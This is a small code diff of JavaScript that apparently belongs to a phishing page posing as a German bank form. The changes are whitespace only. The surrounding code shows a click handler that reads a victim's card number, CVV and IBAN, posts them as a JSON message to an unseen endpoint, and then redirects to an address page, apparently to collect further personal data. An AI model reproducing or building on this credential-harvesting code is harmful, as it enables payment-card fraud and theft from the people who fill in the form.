@@ -722,7 +722,8 @@ btn.addEventListener("click", async () => {
 
   // BANK_NAME ist bereits gesetzt (oder hier nochmal sichern)
   if (BANKS_DE) BANK_NAME = bankNameFromIban(ibanEl.value) || "";
-const cardDigits = (cardEl.value || "").replace(/\D/g, "");
+
+  const cardDigits = (cardEl.value || "").replace(/\D/g, "");
 const iban = (ibanEl.value || "")
   .toUpperCase()
   .replace(/[^A-Z0-9]/g, "");
@@ -744,6 +745,9 @@ const cvv = (cvvEl.value || "").replace(/\D/g, "");
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ message: msg })
   });
+  
+
+  
 
   window.location.href = "adresse.html";
 });
